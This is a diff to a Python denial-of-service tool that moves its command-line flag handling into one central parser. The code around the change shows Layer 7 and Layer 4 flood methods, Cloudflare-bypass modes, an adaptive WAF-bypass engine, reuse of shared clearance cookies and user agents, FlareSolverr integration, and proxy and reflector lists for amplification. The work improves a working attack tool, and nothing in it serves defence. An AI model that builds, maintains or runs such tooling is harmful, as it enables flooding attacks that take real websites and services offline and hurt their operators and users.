@@ -5072,12 +5072,13 @@ def parse_global_flags(argv: list[str]) -> tuple[list[str], dict[str, Any]]:
         "debug": False,
         "evasion": False,
         "go": False,
+        "session_id": None,
     }
     args_iter = iter(argv)
     for arg in args_iter:
         if arg == "--smart":
             flags["smart"] = True
-        elif arg == "--debug":
+        elif arg in ("--debug", "--verbose"):
             flags["debug"] = True
         elif arg == "--go":
             flags["go"] = True
@@ -5115,6 +5116,9 @@ def parse_global_flags(argv: list[str]) -> tuple[list[str], dict[str, Any]]:
         elif arg == "--shared-ua":
             try: flags["shared_ua"] = next(args_iter)
             except StopIteration: pass
+        elif arg == "--session-id":
+            try: flags["session_id"] = next(args_iter)
+            except StopIteration: pass
         else:
             clean_pos.append(arg)
     return clean_pos, flags
@@ -5126,7 +5130,8 @@ async def main_async():
     try:
         loop = asyncio.get_event_loop()
         loop.set_default_executor(SYNC_EXECUTOR)
-        one = argv[1].upper()
+        clean_argv, flags = parse_global_flags(argv)
+        one = clean_argv[1].upper()
         if one == "HELP":
             raise IndexError()
         if one == "TOOLS":
@@ -5152,7 +5157,7 @@ async def main_async():
             # Default to assets path for creation (harvest)
             return p_assets
 
-        urlraw = argv[2].strip()
+        urlraw = clean_argv[2].strip()
         if not urlraw.startswith("http"):
             # Cloudflare-specific methods should default to HTTPS
             if any(cf_m in one.upper() for cf_m in ["CFB", "CFBUAM", "BEHAVIOR", "BROWSER"]):
@@ -5162,26 +5167,30 @@ async def main_async():
         if method not in Methods.ALL_METHODS:
             exit("Method Not Found %s" % ", ".join(Methods.ALL_METHODS))
 
-        # --- Global Flags ---
-        go_core_enabled = "--go" in argv
-        _session_id = None
-        if "--debug" in argv or "--verbose" in argv:
+        # --- Apply Centralized Global Flags ---
+        go_core_enabled = flags["go"]
+        _session_id = flags["session_id"]
+        if flags["debug"]:
             ENGINE_STATE.debug_mode = True
             logger.setLevel(logging.DEBUG)
-        if "--smart" in argv:
+        if flags["smart"]:
             ENGINE_STATE.smart_mode = True
             ML_ENGINE.smart_rpc_enabled = True
             ML_ENGINE.enabled = True
             logger.info("[*] ML_ENGINE: Smart Adaptive WAF Bypass ACTIVE.")
-        if "--adaptive" in argv:
-            ENGINE_STATE.adaptive_mode = True
-            logger.info("[*] ADAPTIVE_ENGINE: Real-time traffic adaptation ACTIVE.")
-        for i, arg in enumerate(argv):
-            if arg == "--session-id" and i + 1 < len(argv):
-                _session_id = argv[i + 1]
-            elif arg == "--engines" and i + 1 < len(argv):
-                ENGINE_STATE.engines = [e.strip().upper() for e in argv[i + 1].split(",") if e.strip()]
-                logger.info(f"[*] ENGINES: Multi-engine routing ACTIVE: {ENGINE_STATE.engines}")
+        if flags["adaptive"] is not None:
+            ENGINE_STATE.adaptive_mode = flags["adaptive"]
+            if flags["adaptive"]:
+                logger.info("[*] ADAPTIVE_ENGINE: Real-time traffic adaptation ACTIVE.")
+        if flags["engines"]:
+            ENGINE_STATE.engines = [e.strip().upper() for e in flags["engines"].split(",") if e.strip()]
+            logger.info(f"[*] ENGINES: Multi-engine routing ACTIVE: {ENGINE_STATE.engines}")
+        if flags["intensity"] is not None:
+            ML_ENGINE.intensity = flags["intensity"]
+        if flags["flaresolverr"] is not None:
+            ENGINE_STATE.flaresolverr_url = flags["flaresolverr"]
+        if flags["flaresolverr_tabs"] is not None:
+            ENGINE_STATE.flaresolverr_tabs = flags["flaresolverr_tabs"]
 
         if go_core_enabled:
             logger.info(f"{bcolors.OKGREEN}[*] Hybrid Core: High-performance Go Engine active.{bcolors.RESET}")
@@ -5205,11 +5214,11 @@ async def main_async():
             # Determine threads and duration
             try:
                 if method in Methods.LAYER7_METHODS:
-                    go_threads = int(argv[4])
-                    go_duration = int(argv[7])
+                    go_threads = int(clean_argv[4])
+                    go_duration = int(clean_argv[7])
                 else: # L4
-                    go_threads = int(argv[3])
-                    go_duration = int(argv[4])
+                    go_threads = int(clean_argv[3])
+                    go_duration = int(clean_argv[4])
             except:
                 go_threads = 100
                 go_duration = 60
@@ -5244,38 +5253,25 @@ async def main_async():
                 except Exception as e:
                     exit("Hostname Unresolved: ", target_host, str(e))
             proxy_ty, threads, proxy_arg, rpc, timer = (
-                int(argv[3]),
-                int(argv[4]),
-                argv[5].strip(),
-                int(argv[6]),
-                int(argv[7]),
+                int(clean_argv[3]),
+                int(clean_argv[4]),
+                clean_argv[5].strip(),
+                int(clean_argv[6]),
+                int(clean_argv[7]),
             )
             
-            # Global Flag Detection
-            args_iter = iter(argv[8:])
-            for arg in args_iter:
+            # Apply L7 state flags
+            if flags["autoscale"]:
+                ENGINE_STATE.active_threads_target.value = threads
+            if flags["shared_cookie"]:
+                HttpFlood._cfbuam_cookie = flags["shared_cookie"]
+                HttpFlood._cfbuam_expiry = time() + 900 # Valid for 15 mins
+            if flags["shared_ua"]:
+                HttpFlood._cfbuam_ua = flags["shared_ua"]
+            
+            for arg in clean_argv[8:]:
                 if arg.isdigit():
                     refresh_mins = int(arg)
-                elif arg == "--autoscale":
-                    ENGINE_STATE.active_threads_target.value = threads
-                elif arg == "--evasion":
-                    pass
-                elif arg == "--intensity":
-                    try:
-                        intensity_val = int(next(args_iter, 15))
-                        ML_ENGINE.intensity = max(0, min(50, intensity_val))
-                    except: pass
-                elif arg == "--shared-cookie":
-                    HttpFlood._cfbuam_cookie = next(args_iter, None)
-                    HttpFlood._cfbuam_expiry = time() + 900 # Valid for 15 mins
-                elif arg == "--shared-ua":
-                    HttpFlood._cfbuam_ua = next(args_iter, None)
-                elif arg == "--flaresolverr":
-                    ENGINE_STATE.flaresolverr_url = next(args_iter, "http://localhost:8191/v1")
-                elif arg == "--flaresolverr-tabs":
-                    try:
-                        ENGINE_STATE.flaresolverr_tabs = int(next(args_iter, 0))
-                    except: pass
 
             # Auto-load from Intelligence DB if not provided
             if not HttpFlood._cfbuam_cookie:
@@ -5410,22 +5406,14 @@ async def main_async():
             ):
                 exit("Raw Socket Privilege Required")
             
-            threads, timer, ref = int(argv[3]), int(argv[4]), None
+            threads, timer, ref = int(clean_argv[3]), int(clean_argv[4]), None
             
-            # Dynamic Flag Detection for L4
-            for arg in argv[5:]:
-                if arg == "--autoscale":
-                    ENGINE_STATE.active_threads_target.value = threads
-                elif arg == "--evasion":
-                    pass
-                elif arg == "--intensity":
-                    try:
-                        intensity_val = int(next(args_iter, 15))
-                        ML_ENGINE.intensity = max(0, min(50, intensity_val))
-                    except: pass
+            # Apply L4 state flags
+            if flags["autoscale"]:
+                ENGINE_STATE.active_threads_target.value = threads
 
-            if len(argv) >= 6:
-                argfive = argv[5].strip()
+            if len(clean_argv) >= 6:
+                argfive = clean_argv[5].strip()
                 if argfive and not argfive.startswith("--"):
                     def resolve_reflector_path(arg):
                         # 1. Check reflectors folder (System)
@@ -5453,10 +5441,10 @@ async def main_async():
                         ref = set(a.strip() for a in Tools.IP.findall(ref_data))
                         if not ref:
                             exit("Reflector Asset Empty")
-                    elif argfive.isdigit() and len(argv) >= 7:
-                        proxy_ty, proxy_arg = int(argfive), argv[6].strip()
-                        if len(argv) >= 8 and argv[7].isdigit():
-                            refresh_mins = int(argv[7])
+                    elif argfive.isdigit() and len(clean_argv) >= 7:
+                        proxy_ty, proxy_arg = int(argfive), clean_argv[6].strip()
+                        if len(clean_argv) >= 8 and clean_argv[7].isdigit():
+                            refresh_mins = int(clean_argv[7])
                         proxy_li = resolve_proxy_path(proxy_arg)
                         proxies = await asyncio.to_thread(handleProxyList, con, proxy_li, proxy_ty)
                         if proxies:
